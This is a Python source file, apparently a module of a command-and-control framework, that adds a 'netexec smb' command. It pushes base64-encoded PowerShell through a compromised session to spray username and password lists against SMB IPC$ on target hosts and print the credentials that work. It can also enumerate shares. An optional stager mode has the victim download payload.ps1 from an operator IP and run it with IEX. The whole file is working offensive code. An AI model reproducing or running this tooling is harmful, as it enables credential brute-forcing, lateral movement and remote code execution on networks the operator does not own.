import sys
import os
import subprocess
import base64
import argparse

from core.gunnershell.commands.base import register, Command, QuietParser
from core import stager_server as stage
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen = "\001"  + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred   = "\001" + Style.BRIGHT + Fore.RED + "\002"

@register("netexec smb", "nxc smb")
class NetexecSmbCommand(Command):
	"""Brute-force SMB authentication and exec via IPC$"""

	@property
	def help(self):
		return "netexec smb <userfile> <passfile> <domain> <targets> [flags]    SMB auth and exec"

	def execute(self, args):
		parser = QuietParser(prog="netexec smb", add_help=False)
		parser.add_argument("-u", "--users",   dest="userfile", required=True, help="Username for SMB or username file")
		parser.add_argument("-p", "--passes",  dest="passfile", required=True, help="Password for SMB or password file")
		parser.add_argument("-d", "--domain",  dest="domain",   required=False, help="AD domain for authentication")
		parser.add_argument("-t", "--targets", dest="targets",  required=True, help="Single Target, Comma‑sep IPs or CIDRs to spray")
		parser.add_argument("--shares", action="store_true", dest="shares", help="Enumerate SMB shares (only valid when -u and -p are single credentials)")
		parser.add_argument("--stager",        dest="stager",   action="store_true", required=False, help="Download & execute payload.ps1 from C2 instead of --command")
		parser.add_argument("--stager-port",   dest="stager_port", type=int, required=False, default=8000, help="Port your HTTP stager is listening on (default: 8000)")
		parser.add_argument("--stager-ip",     dest="stager_ip", required=False, help="IP address to fetch stager payload from")

		try:
			opts = parser.parse_args(args)
		except SystemExit:
			# argparse already printed its usage; print our colored help too
			print(brightyellow + self.help)
			return

		out = self.logic(
			sid      = self.gs.sid,
			userfile = opts.userfile,
			passfile = opts.passfile,
			domain   = opts.domain,
			targets  = opts.targets,
			stage_ip = opts.stager_ip,
			shares   = opts.shares,
			stager   = opts.stager,
			stage_port = opts.stager_port,
			op_id = self.op_id
		)

	def logic(self, sid, userfile, passfile, domain, targets, stage_ip, shares=False, stager=False, stage_port=8000, op_id="console"):
		if shares:
			# forbid files
			try:
				if os.path.isfile(userfile) or os.path.isfile(passfile):
					return brightred + "[!] --shares only works with single USER and PASS, not files"

			except Exception:
				return brightred + "[!] Unable to access local username and/or password files"

		# 1) load your lists locally
		if os.path.isfile(userfile) and not shares:
			try:
				with open(userfile, 'r') as f:
					users = [u.strip() for u in f if u.strip()]
			except Exception as e:
				return brightred + f"[!] Failed to read userfile: {e}"
		else:
			users = [userfile]

		# 2) Load passwords
		if os.path.isfile(passfile) and not shares:
			try:
				with open(passfile, 'r') as f:
					passes = [p.strip() for p in f if p.strip()]
			except Exception as e:
				return brightred + f"[!] Failed to read passfile: {e}"
		else:
			passes = [passfile]

		"""print(passes)
		print(users)"""

		# 2) embed lists as PS literals
		users_ps  = "@(" + ",".join(f"'{u}'" for u in users) + ")"
		passes_ps = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
		targets_ps= "@(" + ",".join(f"'{t.strip()}'" for t in targets.split(',')) + ")"

		"""print(users_ps)
		print(passes_ps)
		print(targets_ps)"""

		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"

		transport = sess.transport.lower()
		display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

		if not domain:
			hostname_cmd = "hostname"

			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, hostname_cmd, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

			if out:
				domain = out

			else:
				print(brightred + f"[!] Failed to fetch hostname from {display}")
				return None
	
		if not shares:
			ps = f"""
$Users   = {users_ps}
$Passes  = {passes_ps}
$Domain  = '{domain}'
$Targets = {targets_ps}
$devvar = $false

foreach ($T in $Targets) {{
  try {{
		$nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
	}} catch {{
		$nb = $T
	}}
  
  Write-Output "------$T------\n"

  foreach ($U in $Users) {{
	foreach ($P in $Passes) {{

	  # build PSCredential once
	  $sec  = ConvertTo-SecureString $P -AsPlainText -Force
	  $cred = New-Object System.Management.Automation.PSCredential ("$Domain\\$U", $sec)

	  # 1) If Test‑SmbConnection exists, use it
	  if (Get-Command Test-SmbConnection -ErrorAction SilentlyContinue) {{
		try {{
		  $tc = Test-SmbConnection -ServerName $T -Credential $cred -ErrorAction Stop | Out-Null
		  if ($tc.SMBStatus -eq 'Success') {{
			  Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
		  }} else {{
			  $devvar = $true
			  #Write-Output "INVALID $T $U $P"
			}}
		}} catch {{
		  $devvar = $true
		  #Write-Output "INVALID $T $U $P"
		}}
	  }}
	  else {{
		# 2) Fallback: P/Invoke WNetAddConnection2 → WNetCancelConnection2
		try {{
	# will throw if NETRESOURCE isn’t defined
	[NETRESOURCE] | Out-Null
}}
catch {{
	Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential)]
public struct NETRESOURCE {{
	public int dwScope;
	public int dwType;
	public int dwDisplayType;
	public int dwUsage;
	[MarshalAs(UnmanagedType.LPWStr)] public string lpLocalName;
	[MarshalAs(UnmanagedType.LPWStr)] public string lpRemoteName;
	[MarshalAs(UnmanagedType.LPWStr)] public string lpComment;
	[MarshalAs(UnmanagedType.LPWStr)] public string lpProvider;
}}
public class Win32 {{
	[DllImport("mpr.dll", CharSet=CharSet.Auto)]
	public static extern int WNetAddConnection2(
		ref NETRESOURCE resource, string password, string username, int flags);
	[DllImport("mpr.dll", CharSet=CharSet.Auto)]
	public static extern int WNetCancelConnection2(
		string name, int flags, bool force);
}}
"@ -PassThru | Out-Null
}}
		$nr = New-Object NETRESOURCE
		$nr.dwType = 1
		$nr.lpRemoteName = "\\\\$T\\IPC$"

		$res = [Win32]::WNetAddConnection2([ref]$nr, $P, "$Domain\\$U", 0)
		if ($res -eq 0) {{
		  Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
		  [Win32]::WNetCancelConnection2($nr.lpRemoteName, 0, $true) | Out-Null
		}}
		else {{
		  # 3) Try New-SmbMapping
		  try {{
			New-SmbMapping -RemotePath "\\\\$T\\IPC$" -UserName "$Domain\\$U" -Password $P -ErrorAction Stop | Out-Null
			Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
			Remove-SmbMapping -RemotePath "\\\\$T\\IPC$" -Force | Out-Null
		  }} catch {{
			# 4) Legacy net use
			net use "\\\\$T\\IPC$" /user:"$Domain\\$U" $P /persistent:no > $null 2>&1
			if ($LASTEXITCODE -eq 0) {{
			  Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
			  net use "\\\\$T\\IPC$" /delete > $null 2>&1
			}} else {{
			  $devvar = $true
			  #Write-Output "INVALID $T $U $P"
			}}
		  }}
		}}
	  }}

	}}  
  }}  
}}
"""
	
		if shares:
			ps = f"""
# load the SmbShare module if it exists
Import-Module SmbShare -ErrorAction SilentlyContinue

$Targets = {targets_ps}
$Domain  = '{domain}'
$User    = '{userfile}'
$Pass    = '{passfile}'

$sec  = ConvertTo-SecureString $Pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("$Domain\\$User", $sec)

foreach ($T in $Targets) {{
  try {{ $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0]) }}
  catch {{ $nb = $T }}

  Write-Output "------$T------`n"
  Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} Share           Permissions     Remark" -f $T, $nb)
  Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} -----           -----------     ------" -f $T, $nb)

  try {{
	# 1) Remote share enum via CIM
	$cs = New-CimSession -ComputerName $T -Credential $cred -ErrorAction Stop
	$shares = Get-SmbShare -CimSession $cs -ErrorAction Stop

	if ($shares.Count -eq 0) {{
	throw "No shares returned via CIM"
	}}


	foreach ($s in $shares) {{
	  $perm   = ($s.AccessRight -join ',')
	  $remark = $s.Description
	  try {{
		Write-Output $("WIN         {{0,-15}} 445    {{1,-15}} {{2,-15}} {{3,-15}} {{4}}" -f $T, $nb, $s.Name, $perm, $remark)
	  }} catch {{
		Write-Host ("[!] Error formatting share '{{0}}': {{1}}" -f $s.Name, $_.Exception.Message)
	  }}
	}}

	# clean up
	Remove-CimSession $cs -ErrorAction SilentlyContinue
  }}
  catch {{
	# 2) Fallback to net view if CIM/share cmdlet fails
	Write-Host "TEST"
	try {{
	net view \\\\$T 2>$null |
	  Where-Object {{ $_ -and $_ -match '\\s(Disk|IPC|Printer|Device)\\s' }} |
	  ForEach-Object {{
		$name = ($_ -split ' ')[0]
		$perm = 'N/A'
		$remark = 'N/A'
		if (-not [string]::IsNullOrWhiteSpace($remark)) {{
		# leave it as-is
		}} else {{
		  $remark = 'N/A'
		}}
		Write-Output $("WIN         {{0,-15}} 445    {{1,-15}} {{2, -15}} {{3,-15}} {{4}}" -f $T, $nb, $name, $perm, $remark)
	  }}
	}}
	catch {{ Write-Host "[ERROR] $($_.Exception.Message)" }}
  }}
}}
"""
	
		if not shares:
			b64 = base64.b64encode(ps.encode('utf-16le')).decode()

		elif shares:
			b64 = base64.b64encode(ps.encode('utf-16le')).decode()

		one_liner = (
			"$ps = [System.Text.Encoding]::Unicode"
			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
			"Invoke-Expression $ps"
		)


		if stager:
			u = f"http://{stage_ip}:{stage_port}/payload.ps1"
			ps_cmd = (
				f"$u='{u}';"
				"$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
				"$xml.open('GET',$u,$false);"
				"$xml.send();"
				"IEX $xml.responseText"
			)

			stage.start_stager_server(stage_port, ps)

			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

			else:
				return brightred + "[!] Unknown session transport!"

		else:
			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
	
			else:
				print(brightred + f"[!] Unknown transport for session")
				return None

		if out:
			if "SMB" in out and not shares:
				return out

			if "SMB" in out and "WIN" in out and shares:
				return out

			else:
				print(brightred + f"[!] No valid credentials found")
				return None

		else:
			print(brightred + f"[!] No valid credentials found")
			return None